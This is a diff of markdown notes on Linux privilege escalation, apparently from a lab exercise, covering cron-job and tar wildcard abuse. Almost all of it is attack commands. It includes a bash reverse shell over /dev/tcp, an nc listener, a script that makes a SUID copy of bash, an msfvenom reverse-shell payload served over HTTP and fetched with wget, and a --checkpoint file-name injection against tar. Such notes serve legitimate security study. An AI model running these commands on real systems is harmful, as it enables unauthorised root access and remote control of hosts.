@@ -311,8 +311,10 @@ cat /etc/crontab
 locate overwrite.sh
 cat /usr/local/bin/overwrite.sh
 ls -lah /usr/local/bin/overwrite.sh
-bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+nano /usr/local/bin/overwrite.sh
 bash -i >& /dev/tcp/10.18.5.137/4444 0>&1
+```
+```
 nc -nvlp 4444
 ```
 
@@ -323,9 +325,11 @@ PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 cd /home/user
 pwd
 nano overwrite.sh
+
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
 chmod +xs /tmp/rootbash
+
 chmod +x /home/user/overwrite.sh
 cd tmp
 ls -al
@@ -338,11 +342,15 @@ exit
 ```
 cat /etc/crontab
 cat /usr/local/bin/compress.sh
+
 cd /home/user
 tar czf /tmp/backup.tar.gz *
+```
 cd /var/www/html/priv_esc
-sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f elf -o shell.elf
+sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=4444 -f elf -o shell.elf
 python3 -m http.server
+```
+```
 wget http://10.18.5.137:8000/shell.elf
 chmod +x /home/user/shell.elf
 touch /home/user/--checkpoint=1
